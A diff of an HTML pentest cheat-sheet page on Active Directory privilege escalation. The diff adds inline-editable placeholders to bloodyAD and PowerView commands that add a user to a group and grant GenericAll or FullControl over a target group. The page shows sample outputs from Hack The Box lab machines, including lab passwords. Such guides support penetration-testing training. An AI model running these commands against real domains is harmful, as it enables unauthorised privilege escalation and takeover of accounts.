@@ -155,150 +155,21 @@
   <div class="tips">
   <p><strong>Usage Tips:</strong></p>
   <ul>
+    <li>Click on a keyword to enable inline editing.</li>
     <li>Click inside a code block to copy (excludes comments).</li>
     <li>Use the <strong><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -6 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></strong> button to view examples.</li>
     <li>Click outside to collapse all examples.</li>
   </ul>
 </div>
   <div id="dynamicFormContainer">
-	<form id="dynamicForm" style="display: none;"><div class="input-group"><label for="COM">COM: </label><input type="text" name="COM"></div><div class="input-group"><label for="DC">DC: </label><input type="text" name="DC"></div><div class="input-group"><label for="DOMAIN">DOMAIN: </label><input type="text" name="DOMAIN"></div><div class="input-group"><label for="EXAMPLE">EXAMPLE: </label><input type="text" name="EXAMPLE"></div><div class="input-group"><label for="GROUP">GROUP: </label><input type="text" name="GROUP"></div><div class="input-group"><label for="HASH">HASH: </label><input type="text" name="HASH"></div><div class="input-group"><label for="PASSWORD">PASSWORD: </label><input type="text" name="PASSWORD"></div><div class="input-group"><label for="TARGET_DOMAIN">TARGET DOMAIN: </label><input type="text" name="TARGET_DOMAIN"></div><div class="input-group"><label for="TARGET_GROUP">TARGET GROUP: </label><input type="text" name="TARGET_GROUP"></div><div class="input-group"><label for="TARGET_USER">TARGET USER: </label><input type="text" name="TARGET_USER"></div><div class="input-group"><label for="USER">USER: </label><input type="text" name="USER"></div></form>
+	<form id="dynamicForm" style="display: none;"><div class="input-group"><label for="COM">COM: </label><input type="text" name="COM"></div><div class="input-group"><label for="DC">DC: </label><input type="text" name="DC"></div><div class="input-group"><label for="DOMAIN">DOMAIN: </label><input type="text" name="DOMAIN"></div><div class="input-group"><label for="EXAMPLE">EXAMPLE: </label><input type="text" name="EXAMPLE"></div><div class="input-group"><label for="GROUP">GROUP: </label><input type="text" name="GROUP"></div><div class="input-group"><label for="HASH">HASH: </label><input type="text" name="HASH"></div><div class="input-group"><label for="PASSWORD">PASSWORD: </label><input type="text" name="PASSWORD"></div><div class="input-group"><label for="TARGET_DOMAIN">TARGET DOMAIN: </label><input type="text" name="TARGET_DOMAIN"></div><div class="input-group"><label for="TARGET_GROUP">TARGET GROUP: </label><input type="text" name="TARGET_GROUP"></div><div class="input-group"><label for="TARGET_USER">TARGET USER: </label><input type="text" name="TARGET_USER"></div><div class="input-group"><label for="USER">USER: </label><input type="text" name="USER"></div><div class="input-group"><label for="autoReplace">Auto Replace: </label><input type="checkbox" id="autoReplace" name="autoReplace"></div></form>
 	<div class="buttons center">
-		<button id="form_btn">Show Params Form</button>
+		<button id="form_btn">Show Inspector</button>
 		<button id="replace_btn" style="display: none;">Replace Params</button>
 		<button id="reset_btn" style="display: none;">Reset</button>
 		<button id="clear_btn" style="display: none;">Clear Cache</button>
 	</div>
 </div>
-<style>
-#dynamicFormContainer {
-	width: 100%;
-	margin: 0 auto;
-	background-color: white;
-	padding: 0;
-	box-shadow: 1px 4px 10px 1px #aaa;
-	font-family: system-ui;
-}
-
-#dynamicFormContainer * {
-    box-sizing: border-box;
-}
-
-#dynamicFormContainer input {
-  border-radius: 0.2em;
-  margin-bottom: 15px;
-}
-
-#dynamicFormContainer input:focus {
-  outline: 0.1em solid var(--secondary);
-}
-
-#dynamicFormContainer input[type=text] {
-  width: 100%;
-  border-radius: 0.2em;
-  border: 0.1em solid var(--secondary);
-  padding: 0.4rem;
-  font-size: 0.9rem;
-}
-
-#dynamicFormContainer label {
-	color: #333333;
-	font-size: 0.9rem;
-}
-
-#dynamicFormContainer button {
-	display: inline-block;
-	margin: 20px auto;
-	width: 150px;
-	height: 40px;
-	border-radius: 25px;
-	border: none;
-	color: #f5f5f5;
-	font-weight: 700;
-	background: rgba(44, 82, 179);
-	grid-column: 1 / span 2;
-    justify-self: center;
-}
-
-#dynamicFormContainer button:hover {
-    cursor: pointer;
-    background: rgba(44, 82, 179, 0.95);
-}
-
-#dynamicForm {
-    grid-template-columns: 1fr 1fr;
-    column-gap: 20px;
-    row-gap: 0px;
-    margin: 0 auto;
-    padding: 30px 20px 0;
-}
-
-.input-group {
-    display: flex;
-    flex-direction: column;
-}
-
-.center {
-	display: flex;
-	justify-content: center;
-	align-items: center;
-}
-
- 
-body.dark-mode #dynamicFormContainer {
-	width: 100%;
-	margin: 0 auto;
-	background-color: #23272a;
-	padding: 0;
-	box-shadow: 1px 4px 10px 1px #23272a;
-	font-family: system-ui;
-}
-
-body.dark-mode #dynamicFormContainer * {
-    box-sizing: border-box;
-}
-
-body.dark-mode #dynamicFormContainer input {
-	border-radius: 0.2em;
-	border: 0.1em solid #eeeeee;
-}
-
-body.dark-mode #dynamicFormContainer input:focus {
-	outline: 0.1em solid #616161;
-}
-
-body.dark-mode #dynamicFormContainer input[type=text] {
-  width: 100%;
-  border-radius: 0.2em;
-  border: 0.1em solid #616161;
-  padding: 0.4rem;
-  font-size: 0.9rem;
-  background-color: #bdbdbd;
-}
-
-body.dark-mode #dynamicFormContainer label {
-	color: #fafafa;
-	font-size: 0.9rem;
-}
-
-body.dark-mode #dynamicFormContainer button {
-	display: inline-block;
-	margin: 20px auto;
-	width: 150px;
-	height: 40px;
-	border-radius: 25px;
-	border: none;
-	color: #fafafa;
-	font-weight: 700;
-	background: #616161;
-	grid-column: 1 / span 2;
-    justify-self: center;
-}
-
-body.dark-mode #dynamicFormContainer button:hover {
-    cursor: pointer;
-    background: #424242;
-}
-</style>
   <h3 id="privesc-1-add-self-to-group-from-linux">Privesc #1: Add self to group (From Linux)</h3>
 <p class="tabs">
 <button data-tabset="set1" data-tabcontent="tab1" class="active">bloodyAD</button>
@@ -307,31 +178,31 @@ body.dark-mode #dynamicFormContainer button:hover {
 
 </p><div class="tabset-wrapper" data-tabset-group="set1"><div class="tabcontent active" data-tabset="set1" data-tabcontent="tab1"><h4 id="1-add-self-to-group">1. Add self to group</h4>
 <div class="highlight codeBlock-start"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> With password
-</span></span><span class="line"><span class="cl"><span class="go">bloodyAD -d <span class="o">&lt;DOMAIN&gt;</span> -u '<span class="o">&lt;USER&gt;</span>' -p '<span class="o">&lt;PASSWORD&gt;</span>' --host <span class="o">&lt;DC&gt;</span> add groupMember '<span class="o">&lt;GROUP&gt;</span>' '<span class="o">&lt;USER&gt;</span>'
+</span></span><span class="line"><span class="cl"><span class="go">bloodyAD -d <span class="o editable-keyword">&lt;DOMAIN&gt;</span> -u '<span class="o editable-keyword">&lt;USER&gt;</span>' -p '<span class="o editable-keyword">&lt;PASSWORD&gt;</span>' --host <span class="o editable-keyword">&lt;DC&gt;</span> add groupMember '<span class="o editable-keyword">&lt;GROUP&gt;</span>' '<span class="o editable-keyword">&lt;USER&gt;</span>'
 </span></span></span></code><div class="output-bubble">Sample Output:
 <span class="line"><span class="cl"><span class="gp">$</span> bloodyAD -d rebound.htb -u <span class="s1">'oorend'</span> -p <span class="s1">'1GR8t@$$4u'</span> --host 10.10.11.231 add groupMember SERVICEMGMT <span class="s1">'oorend'</span>
 </span></span><span class="line"><span class="cl"><span class="go">[+] oorend added to SERVICEMGMT
 </span></span></span></div></pre></div><div class="highlight codeBlock"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> With hashes
-</span></span><span class="line"><span class="cl"><span class="go">bloodyAD -d <span class="o">&lt;DOMAIN&gt;</span> -u '<span class="o">&lt;USER&gt;</span>' -p '<span class="o">&lt;HASH&gt;</span>' -f rc4 -k --host <span class="o">&lt;DC&gt;</span> add groupMember '<span class="o">&lt;GROUP&gt;</span>' '<span class="o">&lt;USER&gt;</span>'
+</span></span><span class="line"><span class="cl"><span class="go">bloodyAD -d <span class="o editable-keyword">&lt;DOMAIN&gt;</span> -u '<span class="o editable-keyword">&lt;USER&gt;</span>' -p '<span class="o editable-keyword">&lt;HASH&gt;</span>' -f rc4 -k --host <span class="o editable-keyword">&lt;DC&gt;</span> add groupMember '<span class="o editable-keyword">&lt;GROUP&gt;</span>' '<span class="o editable-keyword">&lt;USER&gt;</span>'
 </span></span></span></code><div class="output-bubble">Sample Output:
 TO-DO</div></pre></div><div class="highlight codeBlock-end"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> With Kerberos
-</span></span><span class="line"><span class="cl"><span class="go">bloodyAD -d <span class="o">&lt;DOMAIN&gt;</span> -u '<span class="o">&lt;USER&gt;</span>' -p '<span class="o">&lt;PASSWORD&gt;</span>' -k --host <span class="o">&lt;DC&gt;</span> add groupMember '<span class="o">&lt;GROUP&gt;</span>' '<span class="o">&lt;USER&gt;</span>'
+</span></span><span class="line"><span class="cl"><span class="go">bloodyAD -d <span class="o editable-keyword">&lt;DOMAIN&gt;</span> -u '<span class="o editable-keyword">&lt;USER&gt;</span>' -p '<span class="o editable-keyword">&lt;PASSWORD&gt;</span>' -k --host <span class="o editable-keyword">&lt;DC&gt;</span> add groupMember '<span class="o editable-keyword">&lt;GROUP&gt;</span>' '<span class="o editable-keyword">&lt;USER&gt;</span>'
 </span></span></span></code><div class="output-bubble">Sample Output:
 <span class="line"><span class="cl"><span class="gp">$</span> bloodyAD -d absolute.htb -u <span class="s1">'m.lovegod'</span> -p <span class="s1">'AbsoluteLDAP2022!'</span> -k --host dc.absolute.htb add groupMember <span class="s1">'NETWORK AUDIT'</span> <span class="s1">'m.lovegod'</span>
 </span></span><span class="line"><span class="cl"><span class="go">[+] m.lovegod added to NETWORK AUDIT
 </span></span></span></div></pre></div><h4 id="2-add-genericall-over-target-group">2. Add genericAll over target group</h4>
 <div class="highlight codeBlock-start"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> With password
-</span></span><span class="line"><span class="cl"><span class="go">bloodyAD -d <span class="o">&lt;DOMAIN&gt;</span> -u '<span class="o">&lt;USER&gt;</span>' -p '<span class="o">&lt;PASSWORD&gt;</span>' --host <span class="o">&lt;DC&gt;</span> add genericAll 'OU=<span class="o">&lt;TARGET_GROUP&gt;</span>,DC=<span class="o">&lt;EXAMPLE&gt;</span>,DC=<span class="o">&lt;COM&gt;</span>' '<span class="o">&lt;USER&gt;</span>'
+</span></span><span class="line"><span class="cl"><span class="go">bloodyAD -d <span class="o editable-keyword">&lt;DOMAIN&gt;</span> -u '<span class="o editable-keyword">&lt;USER&gt;</span>' -p '<span class="o editable-keyword">&lt;PASSWORD&gt;</span>' --host <span class="o editable-keyword">&lt;DC&gt;</span> add genericAll 'OU=<span class="o editable-keyword">&lt;TARGET_GROUP&gt;</span>,DC=<span class="o editable-keyword">&lt;EXAMPLE&gt;</span>,DC=<span class="o editable-keyword">&lt;COM&gt;</span>' '<span class="o editable-keyword">&lt;USER&gt;</span>'
 </span></span></span></code><div class="output-bubble">Sample Output:
 <span class="line"><span class="cl"><span class="gp">$</span> bloodyAD -d rebound.htb -u <span class="s1">'oorend'</span> -p <span class="s1">'1GR8t@$$4u'</span> --host 10.10.11.231 add genericAll <span class="s1">'OU=SERVICE USERS,DC=REBOUND,DC=HTB'</span> <span class="s1">'oorend'</span>
 </span></span><span class="line"><span class="cl"><span class="go">[+] oorend has now GenericAll on OU=SERVICE USERS,DC=REBOUND,DC=HTB
 </span></span></span></div></pre></div><div class="highlight codeBlock-end"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> With Kerberos
-</span></span><span class="line"><span class="cl"><span class="go">bloodyAD -d <span class="o">&lt;DOMAIN&gt;</span> -u '<span class="o">&lt;USER&gt;</span>' -p '<span class="o">&lt;PASSWORD&gt;</span>' -k --host <span class="o">&lt;DC&gt;</span> add genericAll 'OU=<span class="o">&lt;TARGET_GROUP&gt;</span>,DC=<span class="o">&lt;EXAMPLE&gt;</span>,DC=<span class="o">&lt;COM&gt;</span>' '<span class="o">&lt;USER&gt;</span>'
+</span></span><span class="line"><span class="cl"><span class="go">bloodyAD -d <span class="o editable-keyword">&lt;DOMAIN&gt;</span> -u '<span class="o editable-keyword">&lt;USER&gt;</span>' -p '<span class="o editable-keyword">&lt;PASSWORD&gt;</span>' -k --host <span class="o editable-keyword">&lt;DC&gt;</span> add genericAll 'OU=<span class="o editable-keyword">&lt;TARGET_GROUP&gt;</span>,DC=<span class="o editable-keyword">&lt;EXAMPLE&gt;</span>,DC=<span class="o editable-keyword">&lt;COM&gt;</span>' '<span class="o editable-keyword">&lt;USER&gt;</span>'
 </span></span></span></code><div class="output-bubble">Sample Output:
 <span class="line"><span class="cl"><span class="gp">$</span> bloodyAD -d absolute.htb -u <span class="s1">'m.lovegod'</span> -p <span class="s1">'AbsoluteLDAP2022!'</span> -k --host dc.absolute.htb add genericAll <span class="s1">'NETWORK AUDIT'</span> <span class="s1">'m.lovegod'</span> 
 </span></span><span class="line"><span class="cl"><span class="go">[+] m.lovegod has now GenericAll on NETWORK AUDIT
 </span></span></span></div></pre></div><p><small><em>Ref: <a href="https://github.com/CravateRouge/bloodyAD">bloodyAD</a></em></small></p></div><div class="tabcontent" data-tabset="set1" data-tabcontent="tab2"><h4 id="1-connect">1. Connect</h4>
-<div class="highlight"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">sudo ntpdate -s <span class="o">&lt;DC&gt;</span> &amp;&amp; powerview '<span class="o">&lt;DOMAIN&gt;</span>/<span class="o">&lt;USER&gt;</span>:<span class="o">&lt;PASSWORD&gt;</span>@<span class="o">&lt;TARGET_DOMAIN&gt;</span>'
+<div class="highlight"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">sudo ntpdate -s <span class="o editable-keyword">&lt;DC&gt;</span> &amp;&amp; powerview '<span class="o editable-keyword">&lt;DOMAIN&gt;</span>/<span class="o editable-keyword">&lt;USER&gt;</span>:<span class="o editable-keyword">&lt;PASSWORD&gt;</span>@<span class="o editable-keyword">&lt;TARGET_DOMAIN&gt;</span>'
 </span></span></span></code><div class="output-bubble">Sample Output:
 <span class="line"><span class="cl"><span class="gp">$</span> sudo ntpdate -s dc01.rebound.htb <span class="o">&amp;&amp;</span> powerview <span class="s1">'rebound.htb/oorend:1GR8t@$$4u@dc01.rebound.htb'</span>
 </span></span><span class="line"><span class="cl"><span class="go">Logging directory is set to /home/kali/.powerview/logs/dc01.rebound.htb
@@ -339,12 +210,12 @@ TO-DO</div></pre></div><div class="highlight codeBlock-end"><pre tabindex="0" cl
 </span></span></span><span class="line"><span class="cl"><span class="go">(LDAPS)-[dc01.rebound.htb]-[rebound\oorend]
 </span></span></span><span class="line"><span class="cl"><span class="go">PV &gt; 
 </span></span></span></div></pre></div><h4 id="2-add-self-to-group">2. Add self to group</h4>
-<div class="highlight codeBlock-start"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">Add-DomainGroupMember -Identity '<span class="o">&lt;GROUP&gt;</span>' -Members '<span class="o">&lt;USER&gt;</span>'
+<div class="highlight codeBlock-start"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">Add-DomainGroupMember -Identity '<span class="o editable-keyword">&lt;GROUP&gt;</span>' -Members '<span class="o editable-keyword">&lt;USER&gt;</span>'
 </span></span></span></code><div class="output-bubble">Sample Output:
 <span class="line"><span class="cl"><span class="go">PV &gt; Add-DomainGroupMember -Identity 'servicemgmt' -Members 'oorend'
 </span></span></span><span class="line"><span class="cl"><span class="go">[2024-09-24 07:13:17] User oorend successfully added to servicemgmt
 </span></span></span></div></pre></div><div class="highlight codeBlock-end"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Check
-</span></span><span class="line"><span class="cl"><span class="go">Get-DomainGroupMember -Identity '<span class="o">&lt;GROUP&gt;</span>'
+</span></span><span class="line"><span class="cl"><span class="go">Get-DomainGroupMember -Identity '<span class="o editable-keyword">&lt;GROUP&gt;</span>'
 </span></span></span></code><div class="output-bubble">Sample Output:
 <span class="line"><span class="cl"><span class="go">PV &gt; Get-DomainGroupMember -Identity 'servicemgmt'
 </span></span></span><span class="line"><span class="cl"><span class="go">GroupDomainName             : ServiceMgmt
@@ -364,7 +235,7 @@ TO-DO</div></pre></div><div class="highlight codeBlock-end"><pre tabindex="0" cl
 </span></span></span><span class="line"><span class="cl"><span class="go">MemberSID                   : S-1-5-21-4078382237-1492182817-2568127209-7682
 </span></span></span></div></pre></div><h4 id="4-add-fullcontrol-over-target-group">4. Add fullcontrol over target group</h4>
 <div class="highlight codeBlock-start"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Exit and login again to apply changes
-</span></span><span class="line"><span class="cl"><span class="go">Add-DomainObjectAcl -TargetIdentity '<span class="o">&lt;TARGET_GROUP&gt;</span>' -PrincipalIdentity '<span class="o">&lt;USER&gt;</span>' -Rights fullcontrol
+</span></span><span class="line"><span class="cl"><span class="go">Add-DomainObjectAcl -TargetIdentity '<span class="o editable-keyword">&lt;TARGET_GROUP&gt;</span>' -PrincipalIdentity '<span class="o editable-keyword">&lt;USER&gt;</span>' -Rights fullcontrol
 </span></span></span></code><div class="output-bubble">Sample Output:
 <span class="line"><span class="cl"><span class="go">PV &gt; Add-DomainObjectAcl -TargetIdentity 'service users' -PrincipalIdentity 'oorend' -Rights fullcontrol
 </span></span></span><span class="line"><span class="cl"><span class="go">[2024-09-24 07:37:24] [Add-DomainObjectACL] Found target identity: OU=Service Users,DC=rebound,DC=htb
@@ -372,7 +243,7 @@ TO-DO</div></pre></div><div class="highlight codeBlock-end"><pre tabindex="0" cl
 </span></span></span><span class="line"><span class="cl"><span class="go">[2024-09-24 07:37:24] Adding FullControl to OU=Service Users,DC=rebound,DC=htb
 </span></span></span><span class="line"><span class="cl"><span class="go">[2024-09-24 07:37:24] DACL modified successfully!
